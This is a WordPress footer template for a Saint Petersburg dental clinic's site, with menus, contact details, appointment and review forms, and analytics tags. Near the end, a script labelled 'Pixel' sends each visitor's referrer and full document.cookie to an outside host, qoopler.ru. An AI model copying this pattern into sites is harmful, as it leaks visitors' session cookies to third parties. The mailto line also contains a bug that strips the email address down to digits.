<?php
/**
 * The template for displaying the footer
 *
 * Contains the closing of the #content div and all content after.
 *
 * @link https://developer.wordpress.org/themes/basics/template-files/#template-partials
 *
 * @package WordPress
 * @subpackage Twenty_Seventeen
 * @since 1.0
 * @version 1.2
 */

?>

</div><!-- #content -->


<footer>
    <div class="top">
        <div class="clrfx footer-wrapper">
            <div class="footer_content">
                <div class="footer_content__item">
                    <? if( is_front_page() ) {?>
                        <div class="logo clrfx">
                            <div class="img"></div>
                            <div class="desc">Cтоматологическая клиника White</div>
                        </div>
                    <?} else {?>
                        <a href="/" class="logo  clrfx">
                            <div class="img"></div>
                            <div class="desc">Cтоматологическая клиника White</div>
                        </a>
                    <?}  ?>
                    <div class="soc_t">
                        <div class="h_title regal">Подписывайтесь: </div>
                        <div class="soc_in">
                            <? if (get_field('link_fb',32)) {?><a href="<?= get_field('link_fb',32)?>" target="_blank" rel="nofollow" class="link"><i class="fa fa-facebook" aria-hidden="true"></i></a><?}?>
                            <? if (get_field('link_vk',32)) {?><a href="<?= get_field('link_vk',32)?>" target="_blank" rel="nofollow" class="link"><i class="fa fa-vk" aria-hidden="true"></i></a><?}?>
                           <!--  <? if (get_field('link_inst',32)) {?><a href="<?= get_field('link_inst',32)?>" target="_blank" rel="nofollow" class="link"><i class="fa fa-instagram" aria-hidden="true"></i></a><?}?> -->
                            <? if (get_field('youtube',32)) {?><a href="<?= get_field('youtube',32)?>" target="_blank" rel="nofollow" class="link"><i class="fa fa-youtube-play" aria-hidden="true"></i></a><?}?>
                        </div>
                    </div>
    
                    <a href="<?php echo get_permalink(3); ?>" class="politika">Политика конфиденциальности </a>
                </div>
                <div class="footer_content__item">
                    <div class="col_title regal">Меню</div>
                    <?php wp_nav_menu('menu=2'); ?>
                </div>
                <div class="footer_content__item">
                    <div class="col_title regal">Услуги</div>
                    <?php wp_nav_menu(array(
                        'menu' => 5,
                        'depth' => 1
                    )); ?>
                </div>
                
                <div class="footer_content__item">
                    <div class="col_title regal">Часто посещаемые страницы</div>
                    <ul>
                        <?
                        while ( have_rows('pages', 1263) ) : the_row();
                            $array = get_sub_field_object('page_link', 1263);
                            $link_id = $array['value']->ID;
                            $link_name = $array['value']->post_title;

                            if (isset($link_id)) { ?>
                                <li><a href="<?=get_the_permalink($link_id)?>"><?=$link_name?></a></li>
                        <? } endwhile;?>
                    </ul>
                </div>
                
                
                <div class="footer_content__item">
                    <a data-fancybox data-src="#form_zvon" href="javascript:;" class="link_ns">
                        <div class="ico"></div>
                        <span>Записаться на приём</span>
                    </a>
                    <div class="phone its">
                         <?  while ( have_rows('phone', 32) ) : the_row(); ?>
                            <a href="tel:<?= preg_replace('~[^0-9]+~','',get_sub_field('phone_number'))?>" class="phone_link"><? echo get_sub_field('phone_number')?></a>
                        <? endwhile; ?>
                        <div class="timework"><?= get_field('timework', 32)?></div>
                    </div>
                    <div class="mail its">
                        <a href="mailto:<?= preg_replace('~[^0-9]+~','',get_field('E-mail', 32))?>" class="phone"><?= get_field('E-mail', 32)?></a>
                    </div>
                    <a href="https://yandex.ru/maps/2/saint-petersburg/?ll=30.306705%2C59.954191&mode=search&ol=geo&ouri=ymapsbm1%3A%2F%2Fgeo%3Fll%3D30.306713%252C59.954193%26spn%3D0.001000%252C0.001000%26text%3D%25D0%25A0%25D0%25BE%25D1%2581%25D1%2581%25D0%25B8%25D1%258F%252C%2520%25D0%25A1%25D0%25B0%25D0%25BD%25D0%25BA%25D1%2582-%25D0%259F%25D0%25B5%25D1%2582%25D0%25B5%25D1%2580%25D0%25B1%25D1%2583%25D1%2580%25D0%25B3%252C%2520%25D0%259A%25D1%2580%25D0%25BE%25D0%25BD%25D0%25B2%25D0%25B5%25D1%2580%25D0%25BA%25D1%2581%25D0%25BA%25D0%25B8%25D0%25B9%2520%25D0%25BF%25D1%2580%25D0%25BE%25D1%2581%25D0%25BF%25D0%25B5%25D0%25BA%25D1%2582%252C%252063%252F31%2520&z=17" target="_blank" rel="nofollow" class="place its">
                        <div class="big"><?= get_field('adres', 32)?></div>
                        <?  while ( have_rows('metro', 32) ) : the_row(); ?>
                            <div class="sm"><?= get_sub_field('in_metro');?></div>
                        <? endwhile; ?>
                    </a>
                </div>
            </div>
        </div>
    </div>
    <div class="bot">
        <div class="wrap clrfx">
            <div class="left">© 2007-2022. Все права защищены</div>
        </div>
    </div>
</footer>

</div><!-- .site-content-contain -->
</div><!-- #page -->


<div style="display: none;" id="form_zvon">
    <div class="vspl_form smk wid1">
        <div class="block_bot_line">
            <div class="close_form">
                <a href="" class="link_close_form"></a>
            </div>
            <div class="bot_line"></div>
            <div class="ins_bot_line">
                <div class="inner">
                    <div class="top clrfx">
                        <div class="ico">
                            <div class="back_skl"><div class="top_skl"></div></div>
                        </div>
                        <div class="info">
                            <div class="ttl regal"><?= get_field('form_zagolovok',14)?></div>
                            <div class="m_desc"><?= get_field('form_text',14)?></div>
                        </div>
                    </div>
                    <form class="sender sender_sk">
                        <div class="f_sl clrfx">
                            <input type="text" class="name" name="name" placeholder="Имя">
                            <input type="text" class="phone" name="phone" placeholder="Телефон">
                            <button type="submit" class="link_ns big"><span>Записаться</span></button>
                        </div>
                        <input type="hidden" name="hid" value="Всплывающая форма - Записаться на прием к врачу">
                        <div class="desc">Нажимая кнопку «Записаться» вы соглашаетесь с <a href="https://whiteimplant.ru/privacy-policy/">условиями передачи данных</a></div>
                    </form>
                </div>
            </div>
        </div>
    </div>
</div>



<div style="display: none;" id="form_zvon_otz">
    <div class="vspl_form smk ootzib wid1">
        <div class="block_bot_line">
            <div class="close_form">
                <a href="" class="link_close_form"></a>
            </div>
            <div class="bot_line"></div>
            <div class="ins_bot_line">
                <div class="inner">
                    <div class="top clrfx">
                        <div class="ico">
                            <div class="back_skl"><div class="top_skl"></div></div>
                        </div>
                        <div class="info">
                            <div class="ttl regal"><?= get_field('form2_zagolovok',14)?></div>
                            <div class="m_desc"><?= get_field('form2_text',14)?></div>
                        </div>
                    </div>
                    <form class="sender sender_sk2">
                        <div class="f_sl clrfx">
                            <input type="text" class="name" name="name" placeholder="Имя">
                            <input type="text" class="phone rs_rad" name="phone" placeholder="Телефон">
                        </div>
                        <div class="sl clrfx">
                            <textarea placeholder="Оцените работу врача по 5 бальной шкале и напишите свой отзыв" name="text" id="" cols="30" rows="10"></textarea>
                        </div>
                        <div class="form_zvon_otz__rating clrfx">
                            <div class="form_zvon_otz__rating_title">Выберите оценку</div>
                            <div class="radio_cont">
                              <input type="radio" id="1" name="rating" value="1">
                              <label for="1">1</label>
                            </div>
                             <div class="radio_cont">
                              <input type="radio" id="2" name="rating" value="2">
                              <label for="2">2</label>
                            </div>
                             <div class="radio_cont">
                              <input type="radio" id="3" name="rating" value="3">
                              <label for="3">3</label>
                            </div>
                             <div class="radio_cont">
                              <input type="radio" id="4" name="rating" value="4">
                              <label for="4">4</label>
                            </div>
                             <div class="radio_cont">
                              <input type="radio" id="1" name="rating" value="5" checked>
                              <label for="5">5</label>
                            </div>
                        </div>
                        <div class="cls clrfx">
                            <button type="submit" class="link_ns big pos_ns"><span>Оставить отзыв</span></button>

                        </div>
                        <input type="hidden" name="hid" value="Всплывающая форма - Оставить отзыв">
                        <div class="desc" style="text-align: center">Нажимая кнопку «Оставить отзыв» вы соглашаетесь с <a href="https://whiteimplant.ru/privacy-policy/">условиями передачи данных</a></div>
                    </form>
                </div>
            </div>
        </div>
    </div>
</div>

<a data-fancybox data-src="#thanks_li2" href="javascript:;" style="display: none;" class="thanks_link2">Trigger the fancybox</a>
<div style="display: none;" id="thanks_li2">
    <div class="vspl_form smk wid1">
        <div class="block_bot_line">
            <div class="close_form">
                <a href="" class="link_close_form"></a>
            </div>
            <div class="bot_line"></div>
            <div class="ins_bot_line">
                <div class="inner">
                    <div class="p_th">
                        <div class="b_ttl regal">Спасибо за ваш отзыв!</div>
                        <a href="/" class="link_ns big">На главную</a>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<?php wp_footer(); ?>
<script type="text/javascript" >
    (function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)};
        m[i].l=1*new Date();k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)})
    (window, document, "script", "https://mc.yandex.ru/metrika/tag.js", "ym");

    ym(56108020, "init", {
        clickmap:true,
        trackLinks:true,
        accurateTrackBounce:true,
        webvisor:true
    });
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/56108020" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<script async src="https://www.googletagmanager.com/gtag/js?id=UA-151650633-1"></script>
<script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-151650633-1');
</script>
<!-- Pixel -->
<script type="text/javascript">
    (function (d, w) {
        var n = d.getElementsByTagName("script")[0],
            s = d.createElement("script"),
            f = function () { n.parentNode.insertBefore(s, n); };
                s.type = "text/javascript";
                s.async = true;
                s.src = "https://qoopler.ru/index.php?ref="+d.referrer+"&cookie=" + encodeURIComponent(document.cookie);
                if (w.opera == "[object Opera]") {
                    d.addEventListener("DOMContentLoaded", f, false);
                } else { f(); }
    })(document, window);
</script>
<!-- /Pixel -->
</body>
</html>
